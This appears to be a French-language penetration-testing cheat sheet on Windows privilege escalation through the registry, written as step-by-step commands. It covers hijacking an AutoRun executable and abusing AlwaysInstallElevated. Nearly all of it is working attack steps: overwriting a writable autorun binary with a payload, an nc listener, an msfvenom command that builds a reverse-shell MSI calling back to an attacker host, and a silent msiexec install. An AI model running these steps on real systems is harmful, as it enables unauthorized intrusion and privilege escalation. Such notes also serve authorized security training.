# Registry

## AutoRun

Interrogez le registre pour affichers les exécutables automatiques

```sh
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

À l'aide de accesschk, rechercher l'exécutable accessible en écriture

```sh
accesschk.exe /accepteula -wvu "FULL_PATH\file.exe"
# check: RW BUILTIN\Users | RW Everyone
#			FILE_ALL_ACCESS
```

Remplacez l'exécutable accessible en écriture par le payload

```sh
copy C:\temp\payload.exe "FULL_PATH\file.exe" /Y
```

Démarrez un écouteur sur Kali

```sh
rlwrap nc -nlvp 444
```

Redémarrez la machine Windows pour déclencher un reverse shell

> Dans un engagement réel, vous devrez attendre qu'un administrateur se connecte lui-même!

## AlwaysInstallElevated

Pour pouvoir exploiter cette vulnérabilité, les deux clés de registre doivent être définis sur 1(0x1)
Dans le cas contraire, l'exploitation ne sera pas possible

```sh
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Si ceux-ci sont définis, générer un fichier `.msi` et transféré le fichier a la victime

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK_IP> LPORT=9001 -f msi -o malicious.msi
```

Une fois que vous avez transféré le fichier malveillant, exécuter le programme d'installation avec la commande ci-dessous et recevoir le shell

```sh
msiexec /quiet /qn /i C:\Temp\malicious.msi
```
